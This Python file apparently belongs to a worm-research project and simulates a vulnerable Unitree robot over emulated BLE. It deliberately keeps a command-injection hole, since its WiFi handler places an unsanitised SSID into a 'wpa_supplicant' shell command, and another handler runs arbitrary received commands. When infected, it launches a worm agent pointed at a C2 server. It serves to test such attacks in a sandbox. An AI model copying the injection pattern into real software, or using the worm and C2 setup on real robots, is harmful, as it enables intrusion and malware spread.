#!/usr/bin/env python3
"""
Unitree Robot Simulator
Emulates vulnerable Unitree robots for worm testing
"""

import asyncio
import random
import subprocess
import sys
import os
from typing import Optional, List
from pathlib import Path

# Set up virtual BLE if enabled
if os.getenv("VIRTUAL_BLE", "false").lower() == "true":
    import virtual_ble
    virtual_ble.enable_virtual_mode()

from uniroam import config
from uniroam.exploit_lib import encrypt_data, decrypt_data
from command_sandbox import CommandSandbox

class UnitreeSimulator:
    """
    Simulates a vulnerable Unitree robot
    
    Features:
    - Full BLE protocol emulation with AES encryption
    - Vulnerable command injection in WiFi config
    - Actually spawns worm agent when infected
    - Sandboxed execution for safety
    """
    
    def __init__(self, model: str = "Go2", serial: str = "SIM_001", mode: str = "virtual"):
        """
        Initialize robot simulator
        
        Args:
            model: Robot model (Go2, G1, B2, H1)
            serial: Serial number/ID
            mode: Operation mode (virtual, distributed)
        """
        self.model = f"{model}_SIM"
        self.serial = serial
        self.mode = mode
        
        # Full device name for BLE advertisement
        self.device_name = f"{self.model}_{serial}"
        
        # Infection state
        self.is_infected = False
        self.worm_process = None
        self.worm_log_file = None
        self.infection_time = None
        
        # BLE device reference (set by attach_ble)
        self.ble_device = None
        
        # Create sandbox for safe execution
        self.sandbox = CommandSandbox(
            root_path=f"/tmp/robot_sim_{serial}",
            allow_network=config.SANDBOX_ALLOW_NETWORK,
            robot_id=serial
        )
        
        # Serial number chunking state
        self.serial_chunks = []
        self._prepare_serial_chunks()
        
        print(f"[+] Initialized simulator: {self.device_name}")
    
    def _prepare_serial_chunks(self):
        """Prepare serial number in chunks for BLE transmission"""
        serial_bytes = self.serial.encode('utf-8')
        chunk_size = config.BLE_CHUNK_SIZE
        
        # Split into chunks
        chunks = [serial_bytes[i:i+chunk_size] for i in range(0, len(serial_bytes), chunk_size)]
        self.serial_chunks = chunks
    
    def attach_ble(self, adapter):
        """
        Attach to virtual BLE adapter
        
        Args:
            adapter: VirtualBLEAdapter instance
        """
        self.ble_device = adapter.register_device(
            name=self.device_name,
            simulator=self
        )
        print(f"[+] {self.device_name} advertising on BLE")
    
    async def handle_ble_write(self, data: bytes) -> Optional[bytes]:
        """
        Handle incoming BLE write command
        
        This is the main entry point for exploit attempts.
        
        Args:
            data: Encrypted BLE packet
            
        Returns:
            Encrypted response packet or None
        """
        try:
            # Decrypt packet
            decrypted = decrypt_data(data)
            
            if len(decrypted) < 3:
                return None
            
            # Validate packet structure
            if decrypted[0] != 0x52:  # Magic byte
                return None
            
            # Extract instruction
            instruction = decrypted[2]
            
            print(f"[*] {self.device_name} received instruction: {instruction}")
            
            # Route to appropriate handler
            if instruction == 1:
                return await self._handle_handshake(decrypted)
            elif instruction == 2:
                return await self._handle_serial_request(decrypted)
            elif instruction == 3:
                return await self._handle_wifi_config(decrypted)
            elif instruction == 4:
                return await self._handle_command(decrypted)
            else:
                return self._create_error_response()
                
        except Exception as e:
            print(f"[!] {self.device_name} packet handling error: {e}")
            return None
    
    async def _handle_handshake(self, packet: bytes) -> bytes:
        """
        Handle handshake authentication
        
        Expected data: "unitree" string
        """
        try:
            # Extract handshake data
            data_start = 3
            data_end = packet[1]  # Length byte
            handshake_data = packet[data_start:data_end-1].decode('utf-8', errors='ignore')
            
            # Verify handshake
            if config.HANDSHAKE_SECRET in handshake_data:
                print(f"[+] {self.device_name} handshake successful")
                return self._create_response(1, [0x01])  # Success
            else:
                print(f"[!] {self.device_name} handshake failed")
                return self._create_response(1, [0x00])  # Failure
                
        except Exception as e:
            print(f"[!] {self.device_name} handshake error: {e}")
            return self._create_response(1, [0x00])
    
    async def _handle_serial_request(self, packet: bytes) -> bytes:
        """
        Handle serial number request
        
        Returns serial number in chunks (chunked transmission)
        """
        print(f"[*] {self.device_name} sending serial number")
        
        # For simplicity, send first chunk
        # Real implementation would handle multi-chunk responses
        chunk_index = 0
        total_chunks = len(self.serial_chunks)
        chunk_data = self.serial_chunks[chunk_index]
        
        # Build response: [instruction, chunk_index, total_chunks, ...data]
        response_data = [0x02, chunk_index, total_chunks] + list(chunk_data)
        return self._create_response(2, response_data)
    
    async def _handle_wifi_config(self, packet: bytes) -> bytes:
        """
        Handle WiFi configuration command
        
        THIS IS THE VULNERABLE FUNCTION!
        Contains command injection vulnerability in SSID parsing.
        """
        try:
            # Extract SSID from packet (simplified)
            ssid_start = 3
            ssid_data = packet[ssid_start:-1]  # Exclude checksum
            
            # Convert to string (may contain injection)
            ssid = ''.join(chr(b) for b in ssid_data if 32 <= b < 127)
            
            print(f"[*] {self.device_name} WiFi config: SSID='{ssid}'")
            
            # VULNERABLE: Command injection in wpa_supplicant command
            # Real Unitree vulnerability: SSID is not sanitized
            command = f'wpa_supplicant -c "{ssid}"'
            
            # Execute command in sandbox (allows injection!)
            result = self.sandbox.execute(command, timeout=15)
            
            print(f"[*] {self.device_name} command result: exit={result['exit_code']}")
            
            # Check if this was an infection attempt
            if "python" in ssid.lower() and not self.is_infected:
                print(f"[!] {self.device_name} INFECTION DETECTED!")
                await self._handle_infection(ssid)
            
            # Return success response
            return self._create_response(3, [0x01])
            
        except Exception as e:
            print(f"[!] {self.device_name} WiFi config error: {e}")
            return self._create_response(3, [0x00])
    
    async def _handle_command(self, packet: bytes) -> bytes:
        """Handle generic command execution"""
        try:
            cmd_data = packet[3:-1]
            cmd = ''.join(chr(b) for b in cmd_data if 32 <= b < 127)
            
            print(f"[*] {self.device_name} executing command: {cmd}")
            
            result = self.sandbox.execute(cmd, timeout=15)
            return self._create_response(4, [0x01 if result['exit_code'] == 0 else 0x00])
            
        except Exception as e:
            print(f"[!] {self.device_name} command error: {e}")
            return self._create_response(4, [0x00])
    
    async def _handle_infection(self, injection_payload: str):
        """
        Handle infection event
        
        Actually spawns the worm agent process
        """
        import datetime
        
        self.is_infected = True
        self.infection_time = datetime.datetime.now()
        
        print(f"\n{'='*60}")
        print(f"[!!!] {self.device_name} IS NOW INFECTED")
        print(f"{'='*60}\n")
        
        # Spawn worm agent in sandbox
        if config.SANDBOX_ALLOW_PROPAGATION:
            self._spawn_worm_agent()
    
    def _spawn_worm_agent(self):
        """
        Spawn the actual worm agent process
        
        This makes the simulator a real propagation node!
        """
        try:
            # Build worm agent command
            c2_url = config.get_c2_url()
            
            cmd = [
                sys.executable, "-m", "uniroam.worm_agent",
                "--c2-url", c2_url,
                "--robot-id", self.serial
            ]
            
            # Get sandbox environment with proper PYTHONPATH
            env = self.sandbox.get_env()
            
            # Add current directory to PYTHONPATH so uniroam can be found
            import os
            project_root = os.path.dirname(os.path.abspath(__file__))
            env['PYTHONPATH'] = project_root + os.pathsep + env.get('PYTHONPATH', '')
            
            # Create log file for worm agent output
            log_file = self.sandbox.root_path / f"worm_agent_{self.serial}.log"
            log_handle = open(log_file, 'w')
            
            # Launch in sandbox environment
            # Note: On Windows, we can't use PIPE with asyncio, so we write to a file
            self.worm_process = subprocess.Popen(
                cmd,
                cwd=project_root,  # Run from project root, not sandbox
                env=env,
                stdout=log_handle,
                stderr=subprocess.STDOUT  # Combine stderr with stdout
            )
            
            print(f"[+] {self.device_name} worm agent spawned (PID: {self.worm_process.pid})")
            print(f"    C2 URL: {c2_url}")
            print(f"    Robot ID: {self.serial}")
            print(f"    Log file: {log_file}")
            
            # Check if it's still running after a moment
            import time
            time.sleep(1.0)
            if self.worm_process.poll() is not None:
                log_handle.close()
                # Read the log file for errors
                try:
                    with open(log_file, 'r') as f:
                        log_content = f.read()
                    if log_content:
                        print(f"[!] {self.device_name} worm agent failed immediately:")
                        print(f"    Check log: {log_file}")
                        # Show first few lines
                        lines = log_content.split('\n')[:5]
                        for line in lines:
                            print(f"    {line}")
                except:
                    pass
            else:
                # Keep the log handle in the simulator so it doesn't get closed
                self.worm_log_file = log_handle
            
        except Exception as e:
            print(f"[!] {self.device_name} failed to spawn worm agent: {e}")
    
    def _create_response(self, instruction: int, data: List[int]) -> bytes:
        """
        Create encrypted response packet
        
        Args:
            instruction: Instruction code
            data: Response data bytes
            
        Returns:
            Encrypted response packet
        """
        # Build response packet: [0x51, length, instruction, ...data, checksum]
        response_data = [0x51, len(data) + 3, instruction] + data
        checksum = (-sum(response_data)) & 0xFF
        plain_response = bytes(response_data + [checksum])
        
        # Encrypt and return
        return encrypt_data(plain_response)
    
    def _create_error_response(self) -> bytes:
        """Create generic error response"""
        return self._create_response(0xFF, [0x00])
    
    async def run(self):
        """
        Main simulator loop
        
        Keeps simulator alive and handles periodic tasks
        """
        print(f"[*] {self.device_name} running...")
        
        try:
            while True:
                # Check if worm process is still running
                if self.worm_process and self.worm_process.poll() is not None:
                    print(f"[!] {self.device_name} worm agent terminated")
                    self.worm_process = None
                
                await asyncio.sleep(5)
                
        except KeyboardInterrupt:
            print(f"\n[*] {self.device_name} shutting down...")
            self.cleanup()
    
    def cleanup(self):
        """Clean up simulator resources"""
        # Terminate worm process
        if self.worm_process:
            self.worm_process.terminate()
            self.worm_process.wait(timeout=5)
        
        # Close log file if open
        if hasattr(self, 'worm_log_file') and self.worm_log_file:
            try:
                self.worm_log_file.close()
            except:
                pass
        
        # Clean up sandbox
        if config.DEBUG_MODE:
            print(f"[*] Sandbox command history for {self.device_name}:")
            for cmd in self.sandbox.get_history():
                print(f"    {cmd}")
        
        # Optionally clean up sandbox filesystem
        # self.sandbox.cleanup()
    
    def get_status(self) -> dict:
        """Get simulator status"""
        return {
            "device_name": self.device_name,
            "model": self.model,
            "serial": self.serial,
            "is_infected": self.is_infected,
            "infection_time": self.infection_time.isoformat() if self.infection_time else None,
            "worm_running": self.worm_process is not None and self.worm_process.poll() is None,
            "ble_address": self.ble_device.address if self.ble_device else None
        }

async def create_simulator(model: str = "Go2", serial: str = None, auto_start: bool = True) -> UnitreeSimulator:
    """
    Factory function to create and initialize a simulator
    
    Args:
        model: Robot model
        serial: Serial number (auto-generated if None)
        auto_start: Automatically attach to BLE adapter
        
    Returns:
        Configured UnitreeSimulator
    """
    if serial is None:
        serial = f"SIM_{random.randint(1000, 9999)}"
    
    simulator = UnitreeSimulator(model=model, serial=serial)
    
    # Attach to virtual BLE if enabled
    if config.VIRTUAL_BLE_ENABLED and auto_start:
        from virtual_ble import get_virtual_adapter
        adapter = get_virtual_adapter()
        simulator.attach_ble(adapter)
    
    return simulator

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Unitree Robot Simulator")
    parser.add_argument("--model", default="Go2", help="Robot model")
    parser.add_argument("--serial", default=None, help="Serial number")
    parser.add_argument("--mode", default="virtual", choices=["virtual", "distributed"])
    parser.add_argument("--c2-url", help="C2 server URL")
    
    args = parser.parse_args()
    
    # Set C2 URL if provided
    if args.c2_url:
        os.environ["C2_HOST"] = args.c2_url.split("://")[1].split(":")[0]
        if ":" in args.c2_url.split("://")[1]:
            os.environ["C2_PORT"] = args.c2_url.split(":")[-1]
    
    # Enable virtual BLE
    os.environ["VIRTUAL_BLE"] = "true"
    
    async def main():
        simulator = await create_simulator(
            model=args.model,
            serial=args.serial
        )
        await simulator.run()
    
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Simulator terminated")

